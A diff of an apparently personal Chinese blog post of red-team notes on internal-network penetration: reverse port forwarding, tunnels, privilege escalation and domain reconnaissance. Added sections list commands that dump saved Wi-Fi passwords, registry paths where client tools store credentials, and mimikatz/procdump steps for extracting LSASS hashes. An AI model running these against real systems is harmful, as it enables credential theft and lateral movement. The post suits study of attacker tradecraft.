@@ -26,7 +26,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/07/09/红蓝之隧道搭建与主机信息搜集/1594878033575.png">
 <meta property="og:image" content="http://yoursite.com/2020/07/09/红蓝之隧道搭建与主机信息搜集/1594880644853.png">
 <meta property="og:image" content="http://yoursite.com/2020/07/09/红蓝之隧道搭建与主机信息搜集/1594697737662.png">
-<meta property="og:updated_time" content="2020-08-08T05:33:41.743Z">
+<meta property="og:updated_time" content="2020-08-31T10:08:13.975Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="红蓝之隧道搭建与主机信息搜集">
 <meta name="twitter:description" content="获取shell一般来说我们获取shell的途径就是 1、注入 2、文件上传 3、代码执行，反序列化、表达式注入其实都可以归类为代码执行 4、端口漏洞 1、2、4是每个系统各有不同，3的话更多的是已知的组件的漏洞，除非有源代码，不然是挖不到的。 反弹shell、搭建跳板拥有命令执行的权限后我们能写可以写入webshell，又或者反弹shell控制机器，建立一个方便操作的环境。 可以用于搭建隧道的是网">
@@ -167,7 +167,7 @@ ga('send', 'pageview');
 
   <div id="toc" class="toc-article">
     <strong class="toc-title">Posts List</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#获取shell"><span class="toc-text">获取shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#反弹shell、搭建跳板"><span class="toc-text">反弹shell、搭建跳板</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹shell"><span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NPS"><span class="toc-text">NPS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Http隧道"><span class="toc-text">Http隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS隧道"><span class="toc-text">DNS隧道</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#提权"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux提权"><span class="toc-text">linux提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞提权"><span class="toc-text">漏洞提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#suid提权"><span class="toc-text">suid提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows提权"><span class="toc-text">Windows提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞提权-1"><span class="toc-text">漏洞提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三方组件提权"><span class="toc-text">第三方组件提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#内网信息收集"><span class="toc-text">内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#主机重要信息搜集"><span class="toc-text">主机重要信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#密码搜集"><span class="toc-text">密码搜集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域-工作组信息收集"><span class="toc-text">域/工作组信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#我是谁，我在哪"><span class="toc-text">我是谁，我在哪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#我要到哪去"><span class="toc-text">我要到哪去</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#获取shell"><span class="toc-text">获取shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#反弹shell、搭建跳板"><span class="toc-text">反弹shell、搭建跳板</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹shell"><span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netsh"><span class="toc-text">netsh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NPS"><span class="toc-text">NPS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Http隧道"><span class="toc-text">Http隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS隧道"><span class="toc-text">DNS隧道</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#提权"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux提权"><span class="toc-text">linux提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞提权"><span class="toc-text">漏洞提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#suid提权"><span class="toc-text">suid提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows提权"><span class="toc-text">Windows提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞提权-1"><span class="toc-text">漏洞提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三方组件提权"><span class="toc-text">第三方组件提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#内网信息收集"><span class="toc-text">内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#账号信息搜集"><span class="toc-text">账号信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#密码搜集"><span class="toc-text">密码搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hash抓取"><span class="toc-text">hash抓取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域-工作组信息搜集"><span class="toc-text">域/工作组信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#我是谁，我在哪"><span class="toc-text">我是谁，我在哪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#我要到哪去"><span class="toc-text">我要到哪去</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
   </div>
 
 
@@ -227,6 +227,9 @@ ga('send', 'pageview');
 <h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>正向shell没啥说的，讲一下反弹，反弹主要是转发绕过端口限制和入站限制。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 公网主机ip 4444 127.0.0.1 3389 3389端口流量转发到具有公网ip主机的4444端口。</span><br><span class="line">lcx.exe -listen 4444 5555 将4444端口流量转发到5555</span><br><span class="line">访问5555就能访问内网3389</span><br></pre></td></tr></table></figure>
 
+<h2 id="netsh"><a href="#netsh" class="headerlink" title="netsh"></a>netsh</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh  interface portproxy add v4tov4 listenport=5555 connectport=80 connectaddress=127.0.0.1  protocol=tcp</span><br></pre></td></tr></table></figure>
+
+<p>将5555转发到127.0.0.1的80端口</p>
 <h2 id="NPS"><a href="#NPS" class="headerlink" title="NPS"></a>NPS</h2><p>可以参考<a href="https://ehang-io.github.io/nps/#/?id=nps" target="_blank" rel="noopener">官方教程</a></p>
 <h2 id="Http隧道"><a href="#Http隧道" class="headerlink" title="Http隧道"></a>Http隧道</h2><p>冰蝎、reGeorg都具有这样的功能使用很简单，可以<a href="https://github.com/L-codes/Neo-reGeorg" target="_blank" rel="noopener">参考</a></p>
 <h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p><a href="https://bl4ck.in/penetration/2016/06/03/%E9%80%9A%E8%BF%87DNS%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99.html" target="_blank" rel="noopener">安装</a>这里不细说了</p>
@@ -260,13 +263,122 @@ ga('send', 'pageview');
 <p>找到可以利用的后可以去网上寻找提权脚本。</p>
 <h2 id="第三方组件提权"><a href="#第三方组件提权" class="headerlink" title="第三方组件提权"></a>第三方组件提权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version查看软件版本信息</span><br><span class="line">mysql:借助mysql的高权限来提高web业务的低权限</span><br><span class="line">udf提权</span><br><span class="line">mof提权</span><br></pre></td></tr></table></figure>
 
-<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p>我们获得一个主机权限后同样需要信息收集，无域环境的渗透好说，这里主要是域渗透环境，我是谁？我在哪？我要到哪去？哲学三问，也是我们需要在内网中需要知道的。这里需要做什么我才初学内网也不清楚，后面边学边改。</p>
-<h2 id="主机重要信息搜集"><a href="#主机重要信息搜集" class="headerlink" title="主机重要信息搜集"></a>主机重要信息搜集</h2><h3 id="密码搜集"><a href="#密码搜集" class="headerlink" title="密码搜集"></a>密码搜集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netsh wlan show profiles # 查看连接过的wifi名称</span><br><span class="line">netsh wlan show profile name=&quot;wifi名称&quot; key=clear # 查看wifi的密码</span><br><span class="line">dir /a %userprofile%\AppData\Local\Microsoft\Credentials* # 查看RDP连接凭证</span><br><span class="line">dir /a /s /b &quot;网站目录\*config*&quot; &gt; 1.txt # 数据库配置文件</span><br><span class="line">laZagne.exe all -oN # 本地wifi/浏览器等密码</span><br><span class="line">dir %APPDATA%\Microsoft\Windows\Recent # 查看最近打开的文档</span><br></pre></td></tr></table></figure>
+<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p>我们获得一个主机权限后同样需要信息收集，我是谁，我在哪，我到哪去。这里需要做什么我才初学内网也不清楚，后面边学边改。</p>
+<h2 id="账号信息搜集"><a href="#账号信息搜集" class="headerlink" title="账号信息搜集"></a>账号信息搜集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type %appdata%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>
 
-<h2 id="域-工作组信息收集"><a href="#域-工作组信息收集" class="headerlink" title="域/工作组信息收集"></a>域/工作组信息收集</h2><h3 id="我是谁，我在哪"><a href="#我是谁，我在哪" class="headerlink" title="我是谁，我在哪"></a>我是谁，我在哪</h3><p>这一步的目的是了解被控制机器的位置与所在网络情况</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">whoami /all 查看自己的权限等</span><br><span class="line">ipconfig /all查看详细的网络信息，通过获得的网络信息，查看自己在哪一段。</span><br><span class="line">netstat -ano 查看端口开放情况</span><br><span class="line">net config workstation 查看当前所在域和登录用户信息</span><br><span class="line">net time /domain 可以判断是否存在域，</span><br></pre></td></tr></table></figure>
+<h3 id="密码搜集"><a href="#密码搜集" class="headerlink" title="密码搜集"></a>密码搜集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">netsh wlan show profiles # 查看连接过的wifi名称</span><br><span class="line">netsh wlan show profile name=&quot;wifi名称&quot; key=clear # 查看wifi的密码</span><br><span class="line">for /f  &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan show profiles&apos;)  do @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear##查看wifi密码</span><br><span class="line"></span><br><span class="line">dir /a %userprofile%\AppData\Local\Microsoft\Credentials* # 查看RDP连接凭证</span><br><span class="line">dir /a /s /b &quot;网站目录\*config*&quot; &gt; 1.txt # 数据库配置文件</span><br><span class="line">laZagne.exe all -oN # 本地wifi/浏览器等密码</span><br><span class="line">dir %APPDATA%\Microsoft\Windows\Recent # 查看最近打开的文档</span><br><span class="line">寻找各种密码、配置文件</span><br></pre></td></tr></table></figure>
 
-<h3 id="我要到哪去"><a href="#我要到哪去" class="headerlink" title="我要到哪去"></a>我要到哪去</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">c段探测nmap和msscan</span><br><span class="line"></span><br><span class="line">域信息了解</span><br><span class="line">net view 当前域或工作组中计算机的列表 /domain查看有哪些域</span><br><span class="line">net view /domain:域名 可以获取到域内所有主机</span><br><span class="line">net group /domain      #查询域里面的组</span><br><span class="line">net group &quot;domain computers&quot; /domain  #查看加入到域内的所有计算机名</span><br><span class="line">net user /domain       #查看域用户</span><br><span class="line">dsquery user 域用户信息</span><br><span class="line"></span><br><span class="line">定位域控</span><br><span class="line">nltest /dclist:xxx     #查看域控制器</span><br><span class="line">net group &quot;domain controllers&quot; /domain   #查看域控制器</span><br><span class="line"></span><br><span class="line">定位域管理员账号</span><br><span class="line">net group &quot;domain admins&quot; /domain     #查看域管理员</span><br></pre></td></tr></table></figure>
+<p>navicat</p>
+<table>
+<thead>
+<tr>
+<th align="center"><strong>数据库</strong></th>
+<th align="center"><strong>路径</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">MySQL</td>
+<td align="center">HKEYCURRENTUSER\Software\PremiumSoft\Navicat\Servers\</td>
+</tr>
+<tr>
+<td align="center">MariaDB</td>
+<td align="center">HKEYCURRENTUSER\Software\PremiumSoft\NavicatMARIADB\Servers\</td>
+</tr>
+<tr>
+<td align="center">MongoDB</td>
+<td align="center">HKEYCURRENTUSER\Software\PremiumSoft\NavicatMONGODB\Servers\</td>
+</tr>
+<tr>
+<td align="center">Microsoft SQL</td>
+<td align="center">HKEYCURRENTUSER\Software\PremiumSoft\NavicatMSSQL\Servers\</td>
+</tr>
+<tr>
+<td align="center">Oracle</td>
+<td align="center">HKEYCURRENTUSER\Software\PremiumSoft\NavicatOra\Servers\</td>
+</tr>
+<tr>
+<td align="center">PostgreSQL</td>
+<td align="center">HKEYCURRENTUSER\Software\PremiumSoft\NavicatPG\Servers\</td>
+</tr>
+<tr>
+<td align="center">SQLite</td>
+<td align="center">HKEYCURRENTUSER\Software\PremiumSoft\NavicatSQLite\Servers\</td>
+</tr>
+</tbody></table>
+<p>SecureCRT</p>
+<table>
+<thead>
+<tr>
+<th align="center"><strong>系统版本</strong></th>
+<th align="center"><strong>路径</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">xp/win2003</td>
+<td align="center">C:\Documents and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</td>
+</tr>
+<tr>
+<td align="center">win7/win2008以上</td>
+<td align="center">C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</td>
+</tr>
+</tbody></table>
+<p>Xshell</p>
+<table>
+<thead>
+<tr>
+<th align="center"><strong>版本</strong></th>
+<th align="center"><strong>路径</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Xshell 5</td>
+<td align="center">%userprofile%\Documents\NetSarang\Xshell\Sessions</td>
+</tr>
+<tr>
+<td align="center">Xshell 6</td>
+<td align="center">%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</td>
+</tr>
+</tbody></table>
+<p>WinSCP</p>
+<blockquote>
+<p>HKCU\Software\Martin Prikryl\WinSCP 2\Sessions</p>
+</blockquote>
+<p>VNC:</p>
+<table>
+<thead>
+<tr>
+<th align="center"><strong>版本</strong></th>
+<th align="center"><strong>路径</strong></th>
+<th align="center"><strong>类型</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">RealVNC</td>
+<td align="center">HKEYLOCALMACHINE\SOFTWARE\RealVNC\vncserver</td>
+<td align="center">Password</td>
+</tr>
+<tr>
+<td align="center">TightVNC</td>
+<td align="center">HKEYCURRENTUSER\Software\TightVNC\Server Value</td>
+<td align="center">Password or PasswordViewOnly</td>
+</tr>
+<tr>
+<td align="center">TigerVNC</td>
+<td align="center">HKEYLOCALUSER\Software\TigerVNC\WinVNC4</td>
+<td align="center">Password</td>
+</tr>
+<tr>
+<td align="center">UltraVNC</td>
+<td align="center">C:\Program Files\UltraVNC\ultravnc.ini</td>
+<td align="center">passwd or passwd2</td>
+</tr>
+</tbody></table>
+<h3 id="hash抓取"><a href="#hash抓取" class="headerlink" title="hash抓取"></a>hash抓取</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">minikatz抓取密码</span><br><span class="line">在线</span><br><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam 获取密文</span><br><span class="line">sekurlsa::logonpasswords 获取明文在12版本后就明文就不在内存中了</span><br><span class="line">离线</span><br><span class="line">使用prodump.exe</span><br><span class="line">32位机器：procdump.exe -accepteula -ma lsass.exe lsass.dmp    </span><br><span class="line">64位机器：procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>
+
+<h2 id="域-工作组信息搜集"><a href="#域-工作组信息搜集" class="headerlink" title="域/工作组信息搜集"></a>域/工作组信息搜集</h2><h3 id="我是谁，我在哪"><a href="#我是谁，我在哪" class="headerlink" title="我是谁，我在哪"></a>我是谁，我在哪</h3><p>这一步的目的是了解被控制机器的位置与所在网络情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">whoami /all 查看自己的权限等</span><br><span class="line">ipconfig /all查看详细的网络信息，通过获得的网络信息，查看自己在哪一段。</span><br><span class="line">netstat -ano 查看端口开放情况</span><br><span class="line">systeminfo 主机架构</span><br><span class="line">tasklist 本机提供的服务</span><br><span class="line">net time /domain这个命令可以用于确定域环境、工作组环境、存在域但不在域中</span><br></pre></td></tr></table></figure>
+
+<h3 id="我要到哪去"><a href="#我要到哪去" class="headerlink" title="我要到哪去"></a>我要到哪去</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">net view /domain 查看有几个域</span><br><span class="line">net view /domain:域名 查看域中主机列表</span><br><span class="line">net group /domain      #查询域里面的组</span><br><span class="line">net group &quot;domain computers&quot; /domain  #查看加入到域内的所有计算机名</span><br><span class="line">nltest /domain_trusts 域信任信息</span><br><span class="line"></span><br><span class="line">定位域控</span><br><span class="line">nltest /dclist:xxx     #查看域控制器</span><br><span class="line">net group &quot;domain controllers&quot; /domain   #查看域控制器</span><br><span class="line"></span><br><span class="line">定位域管理员账号</span><br><span class="line">net group &quot;domain admins&quot; /domain     #查看域管理员</span><br><span class="line">Invoke-UserHunter -UserName &quot;win7user（域用户名）&quot;定位域管理员登录位置</span><br></pre></td></tr></table></figure>
 
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7701" target="_blank" rel="noopener">内网渗透之内网穿透</a></p>
 <p><a href="https://www.cnblogs.com/bmjoker/p/10336247.html" target="_blank" rel="noopener">我所了解的内网渗透</a></p>
